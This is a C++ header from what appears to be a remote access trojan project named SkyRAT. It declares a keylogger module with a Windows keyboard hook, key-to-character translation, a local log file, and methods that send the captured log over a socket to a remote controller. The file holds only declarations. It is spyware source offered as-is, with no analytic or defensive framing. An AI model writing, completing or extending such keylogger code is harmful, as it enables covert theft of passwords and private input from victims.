#pragma once

#include "../Imodule.h"
#include "../../Utils/Logger.h"
#include <windows.h>
#include <string>
#include <memory>
#include <atomic>
#include <thread>
#include <fstream>

namespace SkyRAT {
namespace Modules {
namespace Implementations {

    /**
     * @brief Keylogger module for capturing keyboard input
     */
    class KeyloggerModule : public IModule {
    public:
        KeyloggerModule();
        virtual ~KeyloggerModule();

        // IModule interface implementation
        std::string getName() const override;
        std::string getVersion() const override;
        bool initialize() override;
        void shutdown() override;
        bool isRunning() const override;
        bool start(SOCKET socket) override;
        bool stop() override;
        bool processCommand(const std::string& command, SOCKET socket) override;
        std::string getStatus() const override;
        bool canHandleCommand(const std::string& command) const override;
        bool executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) override;
        std::vector<std::string> getSupportedCommands() const override;

    private:
        // Internal state
        std::atomic<bool> m_isRunning;
        std::atomic<bool> m_shouldStop;
        std::shared_ptr<Utils::Logger> m_logger;
        std::unique_ptr<std::thread> m_keyloggerThread;
        std::unique_ptr<std::ofstream> m_logFile;
        
        // Windows-specific handles
        HHOOK m_keyboardHook;
        SOCKET m_clientSocket;
        
        // Configuration
        std::string m_logFileName;
        
        // Thread functions
        void keyloggerThreadFunction();
        static LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
        
        // Utility functions
        std::string getKeyboardLayoutName();
        std::string getActualCharacter(int vkCode, BYTE keyboardState[256]);
        std::string logNonPrintableKeys(int vkCode);
        std::string getCurrentDateTime();
        void ensureNewlineBeforeAppend(const std::string& filename);
        bool sendLogFile();
        
        // Static instance for hook callback
        static KeyloggerModule* s_instance;
    };

} // namespace Implementations
} // namespace Modules
} // namespace SkyRAT